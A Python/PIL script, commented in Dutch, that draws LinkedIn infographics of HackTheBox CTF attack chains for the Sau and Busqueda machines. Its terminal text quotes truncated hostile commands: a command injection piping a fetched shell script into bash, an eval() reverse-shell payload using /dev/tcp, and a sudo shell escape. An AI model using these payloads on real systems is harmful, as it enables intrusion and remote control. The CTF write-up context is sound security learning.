#!/usr/bin/env python3
"""
LinkedIn Image Generator — maakt een attack chain infographic voor een CTF writeup.
root.txt / user.txt worden nooit getoond.
"""

import os
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont

W, H = 1200, 627  # LinkedIn optimaal


def _font(size: int, bold: bool = False) -> ImageFont.FreeTypeFont:
    candidates = [
        f"/usr/share/fonts/truetype/dejavu/DejaVuSansMono{'-Bold' if bold else ''}.ttf",
        f"/usr/share/fonts/truetype/liberation/LiberationMono-{'Bold' if bold else 'Regular'}.ttf",
        f"/usr/share/fonts/truetype/ubuntu/UbuntuMono-{'B' if bold else 'R'}.ttf",
    ]
    for p in candidates:
        if os.path.exists(p):
            return ImageFont.truetype(p, size)
    return ImageFont.load_default()


def generate_image(machine: str, difficulty: str, platform: str,
                   tags: list[str], chain: list[dict],
                   terminal_lines: list[tuple[str, str]],
                   out_path: str) -> str:
    """
    Genereert een LinkedIn infographic.

    chain: lijst van {"label": str, "sub": str, "color": str, "detail": str}
    terminal_lines: lijst van (tekst, kleur) — NOOIT root.txt of user.txt inhoud opnemen
    """
    img  = Image.new("RGB", (W, H), "#0d1117")
    draw = ImageDraw.Draw(img)

    accent = "#3fb950"
    blue   = "#58a6ff"

    # Grid
    for x in range(0, W, 60):
        draw.line([(x, 0), (x, H)], fill="#161b22", width=1)
    for y in range(0, H, 60):
        draw.line([(0, y), (W, y)], fill="#161b22", width=1)

    # Links fade
    for i in range(300):
        draw.rectangle([(0, 0), (i, H)], fill=(13, 17, 23))

    # Hoekdecoraties
    for pts in [[(30,60),(30,30),(60,30)], [(W-60,30),(W-30,30),(W-30,60)],
                [(30,H-60),(30,H-30),(60,H-30)], [(W-60,H-30),(W-30,H-30),(W-30,H-60)]]:
        draw.line(pts, fill=accent, width=2)

    f_tiny   = _font(14)
    f_small  = _font(17)
    f_medium = _font(22)
    f_large  = _font(38, bold=True)
    f_xlarge = _font(62, bold=True)
    f_tag    = _font(15)

    # Platform badge
    draw.rounded_rectangle([(50, 48), (50 + len(platform)*11 + 20, 80)],
                            radius=8, fill="#161b22", outline=blue, width=1)
    draw.text((50 + (len(platform)*11 + 20)//2, 64), platform,
              fill=blue, font=f_small, anchor="mm")

    # Difficulty badge
    bx = 60 + len(platform)*11 + 20
    diff_colors = {"Easy": accent, "Medium": "#f0c000", "Hard": "#e94560", "Insane": "#bd2626"}
    diff_fill   = {"Easy": "#1a2d1a", "Medium": "#2d2a1a", "Hard": "#2d1a1a", "Insane": "#1a0a0a"}
    dc = diff_colors.get(difficulty, accent)
    df = diff_fill.get(difficulty, "#1a2d1a")
    draw.rounded_rectangle([(bx, 48), (bx + 90, 80)], radius=8, fill=df, outline=dc, width=1)
    draw.text((bx + 45, 64), difficulty, fill=dc, font=f_small, anchor="mm")

    # Machine naam
    draw.text((50, 100), machine, fill="#e6edf3", font=f_xlarge)

    # Subtitel attack chain samenvatting
    chain_labels = " → ".join(n["label"] for n in chain)
    draw.text((50, 175), chain_labels, fill="#8b949e", font=f_medium)

    # Divider
    draw.rectangle([(50, 215), (560, 217)], fill=accent)

    # Attack chain nodes
    chain_y = 265
    nx = 60
    for i, node in enumerate(chain):
        bx1, bx2 = nx, nx + 140
        by1, by2 = chain_y, chain_y + 72
        col = node.get("color", blue)
        draw.rounded_rectangle([(bx1, by1), (bx2, by2)],
                                radius=10, fill="#161b22", outline=col, width=2)
        draw.text(((bx1+bx2)//2, by1+24), node["label"],
                  fill=col, font=f_large, anchor="mm")
        draw.text(((bx1+bx2)//2, by1+50), node.get("sub", ""),
                  fill="#8b949e", font=f_tiny, anchor="mm")
        draw.text(((bx1+bx2)//2, by2+14), node.get("detail", ""),
                  fill="#30363d", font=f_tiny, anchor="mm")
        if i < len(chain) - 1:
            ax, ay = bx2 + 2, (by1 + by2) // 2
            draw.line([(ax, ay), (ax+38, ay)], fill="#30363d", width=2)
            draw.polygon([(ax+38, ay-6), (ax+38, ay+6), (ax+52, ay)], fill="#30363d")
        nx += 195

    # Tags
    tx, ty = 50, chain_y + 115
    for tag in tags[:6]:
        tw = int(draw.textlength(tag, font=f_tag)) + 20
        draw.rounded_rectangle([(tx, ty), (tx+tw, ty+24)],
                                radius=12, fill="#161b22", outline="#30363d", width=1)
        draw.text((tx + tw//2, ty+12), tag, fill="#8b949e", font=f_tag, anchor="mm")
        tx += tw + 10
        if tx > 560:
            break

    # Terminal paneel rechts
    rx = 680
    draw.rounded_rectangle([(rx, 48), (W-40, H-48)],
                            radius=12, fill="#0d1117", outline="#30363d", width=1)
    draw.rounded_rectangle([(rx, 48), (W-40, 82)],
                            radius=12, fill="#161b22", outline="#30363d", width=1)
    for dx, dc in [(rx+18, "#e94560"), (rx+36, "#f0c000"), (rx+54, accent)]:
        draw.ellipse([(dx-5, 60), (dx+5, 70)], fill=dc)
    draw.text((rx+80, 65), "terminal", fill="#8b949e", font=f_small, anchor="lm")

    ly = 100
    for text, col in terminal_lines:
        if text and ly < H - 70:
            draw.text((rx+20, ly), text, fill=col, font=f_tiny)
        ly += 22

    # Branding
    draw.text((W//2, H-22), "cyberstefan.nl", fill="#30363d", font=f_small, anchor="mm")

    # Scanline accent
    for i, x in enumerate(range(50, 560, 4)):
        draw.rectangle([(x, H-48), (x+2, H-46)], fill=accent)

    img.save(out_path, "PNG")
    print(f"[image] Opgeslagen: {out_path}")
    return out_path


def generate_sau_image(out_path: str = "/tmp/sau_linkedin.png") -> str:
    return generate_image(
        machine    = "Sau",
        difficulty = "Easy",
        platform   = "HackTheBox",
        tags       = ["SSRF", "Command Injection", "Privilege Escalation", "Linux", "Web"],
        chain      = [
            {"label": "SSRF",  "sub": "CVE-2023-27163", "color": "#58a6ff", "detail": "Port 55555"},
            {"label": "RCE",   "sub": "Mailtrail v0.53", "color": "#e94560", "detail": "Port 80"},
            {"label": "ROOT",  "sub": "sudo + less",     "color": "#3fb950", "detail": "GTFOBins"},
        ],
        terminal_lines = [
            ("$ nmap -sC -sV -p-",              "#58a6ff"),
            ("55555/tcp  open  request-baskets", "#e6edf3"),
            ("80/tcp     filtered http",         "#8b949e"),
            ("",                                 ""),
            ("$ curl .../login --data",          "#58a6ff"),
            ("  'username=;curl .../shell|bash'","#8b949e"),
            ("",                                 ""),
            ("[puma@sau ~]$ sudo -l",            "#58a6ff"),
            ("NOPASSWD: /usr/bin/systemctl",     "#e6edf3"),
            ("  status trail.service",           "#e6edf3"),
            ("",                                 ""),
            ("[puma@sau ~]$ sudo systemctl ...", "#58a6ff"),
            ("!sh",                              "#e94560"),
            ("",                                 ""),
            ("# whoami",                         "#58a6ff"),
            ("root",                             "#3fb950"),
            ("# cat /root/root.txt",             "#58a6ff"),
            ("*** REDACTED ***",                 "#30363d"),  # nooit tonen
        ],
        out_path = out_path,
    )


def generate_busqueda_image(out_path: str = "/tmp/busqueda_linkedin.png") -> str:
    return generate_image(
        machine    = "Busqueda",
        difficulty = "Easy",
        platform   = "HackTheBox",
        tags       = ["RCE", "eval() Injection", "Privilege Escalation", "Linux", "Web"],
        chain      = [
            {"label": "RCE",    "sub": "eval() injection",    "color": "#e94560", "detail": "Searchor 2.4.0"},
            {"label": "CREDS",  "sub": ".git/config leak",    "color": "#58a6ff", "detail": "Gitea + MySQL"},
            {"label": "ROOT",   "sub": "relative path + sudo","color": "#3fb950", "detail": "full-checkup.sh"},
        ],
        terminal_lines = [
            ("$ nmap -sC -sV -p-",                "#58a6ff"),
            ("22/tcp  open  ssh",                  "#e6edf3"),
            ("80/tcp  open  http  Apache 2.4.52",  "#e6edf3"),
            ("",                                   ""),
            ("# Searchor 2.4.0 — eval() payload",  "#8b949e"),
            ("engine='+__import__('os').system(", "#58a6ff"),
            ("  'bash -i >& /dev/tcp/... 0>&1')+","#8b949e"),
            ("",                                   ""),
            ("[svc@busqueda app]$ cat .git/config","#58a6ff"),
            ("url = http://cody:***@gitea...",     "#e6edf3"),
            ("",                                   ""),
            ("[svc@busqueda ~]$ sudo -l",          "#58a6ff"),
            ("NOPASSWD: python3 system-checkup.py","#e6edf3"),
            ("",                                   ""),
            ("$ sudo ... full-checkup  # from /tmp","#58a6ff"),
            ("# whoami",                           "#58a6ff"),
            ("root",                               "#3fb950"),
            ("# cat /root/root.txt",               "#58a6ff"),
            ("*** REDACTED ***",                   "#30363d"),
        ],
        out_path = out_path,
    )


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--machine", default="sau")
    parser.add_argument("--out", default=None)
    args = parser.parse_args()
    if args.machine.lower() == "busqueda":
        out = args.out or "/tmp/busqueda_linkedin.png"
        generate_busqueda_image(out_path=out)
    else:
        out = args.out or "/tmp/sau_linkedin.png"
        generate_sau_image(out_path=out)
